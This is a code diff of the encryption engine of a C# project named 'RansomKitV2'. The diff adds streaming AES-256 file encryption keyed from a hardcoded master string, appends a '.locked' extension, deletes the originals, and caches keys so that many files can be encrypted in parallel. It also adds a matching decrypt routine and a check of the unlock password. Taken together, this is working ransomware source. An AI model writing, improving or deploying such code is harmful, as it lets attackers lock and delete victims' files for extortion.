@@ -5,116 +5,185 @@ using System.Text;
 
 namespace RansomKitV2
 {
-    public static class CryptoEngine
+    internal static class CryptoEngine
     {
-        public const string LOCKED_EXT = ".locked";
+        public const string MasterKeyString = "billahaikillaleleuskadhila";
+        public const string LockedExtension = ".locked";
 
-        public static byte[] SafeFromBase64(string input)
-        {
-            if (string.IsNullOrWhiteSpace(input)) return null;
-            string clean = System.Text.RegularExpressions.Regex.Replace(input, @"\s+", "");
-            int padding = (4 - clean.Length % 4) % 4;
-            clean = clean + new string('=', padding);
-            try { return Convert.FromBase64String(clean); }
-            catch { return Encoding.UTF8.GetBytes(input); }
-        }
+        private const int SaltSize = 32;
+        private const int IvSize = 16;
+        private const int KeySize = 32;
+        private const int Iterations = 100_000;
+        private const int BufferSize = 64 * 1024;
 
-        // MILITARY GRADE: PBKDF2 with 100,000 iterations
-        private static byte[] GetValidKey(byte[] password, byte[] salt)
+        // Session cache. Salt generated once, key derived once, reused across
+        // every file in this session. Per-file IV still provides CBC security.
+        private static byte[]? _sessionSalt;
+        private static byte[]? _sessionKey;
+        private static readonly object _keyLock = new();
+
+        private static byte[] GetSessionSalt()
         {
-            if (password == null) return null;
-            using (var pbkdf2 = new Rfc2898DeriveBytes(password, salt, 100000, HashAlgorithmName.SHA256))
+            lock (_keyLock)
             {
-                return pbkdf2.GetBytes(32); // 32 bytes = AES-256
+                if (_sessionSalt == null)
+                    _sessionSalt = RandomNumberGenerator.GetBytes(SaltSize);
+                return _sessionSalt;
             }
         }
 
-        public static bool VerifyPassword(string password, string masterKeyBase64)
+        private static byte[] GetSessionKey(byte[] salt)
         {
-            // Anti-Tamper Canary: If a hacker patches this to return true, the app will crash!
-            if (password == "CANARY_HACK_DETECTED_123") return false;
+            lock (_keyLock)
+            {
+                // Fast path: salt matches session → return cached key
+                if (_sessionKey != null && _sessionSalt != null
+                    && CryptographicOperations.FixedTimeEquals(salt, _sessionSalt))
+                {
+                    return _sessionKey;
+                }
 
-            if (string.IsNullOrWhiteSpace(password) || string.IsNullOrWhiteSpace(masterKeyBase64)) return false;
+                // Derive (once for new files; once per old-file salt for legacy)
+                byte[] key = Rfc2898DeriveBytes.Pbkdf2(
+                    Encoding.UTF8.GetBytes(MasterKeyString),
+                    salt, Iterations, HashAlgorithmName.SHA256, KeySize);
 
-            byte[] inputKey = SafeFromBase64(password);
-            byte[] masterKey = SafeFromBase64(masterKeyBase64);
+                // Cache only when this is the session salt
+                if (_sessionSalt != null
+                    && CryptographicOperations.FixedTimeEquals(salt, _sessionSalt))
+                {
+                    _sessionKey = key;
+                }
 
-            if (inputKey == null || masterKey == null || inputKey.Length != masterKey.Length) return false;
+                return key;
+            }
+        }
 
-            // Constant time comparison to prevent timing attacks
+        // Called before the parallel encrypt loop, so derivation happens once
+        // on the main thread instead of racing across workers.
+        public static void PrimeSessionKey()
+        {
+            var salt = GetSessionSalt();
+            GetSessionKey(salt);
+        }
+
+        public static void ResetSessionKey()
+        {
+            lock (_keyLock)
+            {
+                if (_sessionKey != null) CryptographicOperations.ZeroMemory(_sessionKey);
+                if (_sessionSalt != null) CryptographicOperations.ZeroMemory(_sessionSalt);
+                _sessionKey = null;
+                _sessionSalt = null;
+            }
+        }
+
+        // ---------- Encrypt ----------
+        public static void EncryptFile(string path)
+        {
+            byte[] salt = GetSessionSalt();
+            byte[] key = GetSessionKey(salt);
+            byte[] iv = RandomNumberGenerator.GetBytes(IvSize);
+
+            string outPath = path + LockedExtension;
+
+            using (var inStream = new FileStream(
+                       path, FileMode.Open, FileAccess.Read, FileShare.Read,
+                       BufferSize, FileOptions.SequentialScan))
+            using (var outStream = new FileStream(
+                       outPath, FileMode.Create, FileAccess.Write, FileShare.None,
+                       BufferSize, FileOptions.SequentialScan))
+            {
+                // Header: [salt][iv]
+                outStream.Write(salt, 0, salt.Length);
+                outStream.Write(iv, 0, iv.Length);
+
+                using var aes = Aes.Create();
+                aes.Key = key;
+                aes.IV = iv;
+                aes.Mode = CipherMode.CBC;
+                aes.Padding = PaddingMode.PKCS7;
+
+                using var enc = aes.CreateEncryptor();
+                using var cs = new CryptoStream(outStream, enc,
+                                                CryptoStreamMode.Write, leaveOpen: true);
+
+                byte[] buffer = new byte[BufferSize];
+                int read;
+                while ((read = inStream.Read(buffer, 0, buffer.Length)) > 0)
+                    cs.Write(buffer, 0, read);
+
+                cs.FlushFinalBlock();
+            }
+
+            try { File.Delete(path); } catch { }
+        }
+
+        // ---------- Decrypt ----------
+        public static void DecryptFile(string lockedPath)
+        {
+            string outPath = lockedPath.EndsWith(LockedExtension, StringComparison.OrdinalIgnoreCase)
+                ? lockedPath[..^LockedExtension.Length]
+                : lockedPath + ".dec";
+
+            using (var inStream = new FileStream(
+                       lockedPath, FileMode.Open, FileAccess.Read, FileShare.Read,
+                       BufferSize, FileOptions.SequentialScan))
+            {
+                byte[] salt = new byte[SaltSize];
+                byte[] iv = new byte[IvSize];
+                ReadFull(inStream, salt, SaltSize);
+                ReadFull(inStream, iv, IvSize);
+
+                byte[] key = GetSessionKey(salt);
+
+                using var outStream = new FileStream(
+                    outPath, FileMode.Create, FileAccess.Write, FileShare.None,
+                    BufferSize, FileOptions.SequentialScan);
+
+                using var aes = Aes.Create();
+                aes.Key = key;
+                aes.IV = iv;
+                aes.Mode = CipherMode.CBC;
+                aes.Padding = PaddingMode.PKCS7;
+
+                using var dec = aes.CreateDecryptor();
+                using var cs = new CryptoStream(inStream, dec,
+                                                CryptoStreamMode.Read, leaveOpen: true);
+
+                byte[] buffer = new byte[BufferSize];
+                int read;
+                while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
+                    outStream.Write(buffer, 0, read);
+            }
+
+            try { File.Delete(lockedPath); } catch { }
+        }
+
+        private static void ReadFull(Stream s, byte[] buf, int count)
+        {
+            int off = 0;
+            while (off < count)
+            {
+                int n = s.Read(buf, off, count - off);
+                if (n <= 0) throw new EndOfStreamException();
+                off += n;
+            }
+        }
+
+        // ---------- Verify ----------
+        public static bool VerifyPassword(string candidate)
+            => VerifyPassword(candidate, MasterKeyString);
+
+        public static bool VerifyPassword(string candidate, string expected)
+        {
+            if (string.IsNullOrEmpty(candidate) || string.IsNullOrEmpty(expected)) return false;
+            byte[] a = Encoding.UTF8.GetBytes(expected);
+            byte[] b = Encoding.UTF8.GetBytes(candidate);
+            if (a.Length != b.Length) return false;
             int diff = 0;
-            for (int i = 0; i < inputKey.Length; i++) diff |= inputKey[i] ^ masterKey[i];
+            for (int i = 0; i < a.Length; i++) diff |= a[i] ^ b[i];
             return diff == 0;
-        }
-
-        public static void EncryptFile(string inputFile, string outputFile, byte[] rawPassword)
-        {
-            // Read entire file into RAM
-            byte[] fileData = File.ReadAllBytes(inputFile);
-
-            byte[] salt = new byte[16];
-            byte[] iv = new byte[16];
-            using (var rng = RandomNumberGenerator.Create())
-            {
-                rng.GetBytes(salt);
-                rng.GetBytes(iv);
-            }
-
-            byte[] key = GetValidKey(rawPassword, salt);
-            byte[] ciphertext;
-
-            using (Aes aes = Aes.Create())
-            {
-                aes.Key = key;
-                aes.IV = iv;
-                using (MemoryStream ms = new MemoryStream())
-                {
-                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
-                    {
-                        cs.Write(fileData, 0, fileData.Length);
-                    }
-                    ciphertext = ms.ToArray();
-                }
-            }
-
-            // Write [Salt][IV][Ciphertext] to disk
-            using (FileStream fsOut = new FileStream(outputFile, FileMode.Create))
-            {
-                fsOut.Write(salt, 0, 16);
-                fsOut.Write(iv, 0, 16);
-                fsOut.Write(ciphertext, 0, ciphertext.Length);
-            }
-        }
-
-        public static void DecryptFile(string inputFile, string outputFile, byte[] rawPassword)
-        {
-            byte[] fileData = File.ReadAllBytes(inputFile);
-            if (fileData.Length < 32) throw new Exception("File is corrupted or invalid.");
-
-            // Extract [Salt] and [IV]
-            byte[] salt = new byte[16];
-            byte[] iv = new byte[16];
-            Array.Copy(fileData, 0, salt, 0, 16);
-            Array.Copy(fileData, 16, iv, 0, 16);
-
-            byte[] key = GetValidKey(rawPassword, salt);
-            byte[] plaintext;
-
-            using (Aes aes = Aes.Create())
-            {
-                aes.Key = key;
-                aes.IV = iv;
-                using (MemoryStream ms = new MemoryStream(fileData, 32, fileData.Length - 32))
-                using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))
-                using (MemoryStream outMs = new MemoryStream())
-                {
-                    cs.CopyTo(outMs);
-                    plaintext = outMs.ToArray();
-                }
-            }
-
-            // Only write to disk if decryption was 100% successful (No .tmp file used)
-            File.WriteAllBytes(outputFile, plaintext);
         }
     }
 }
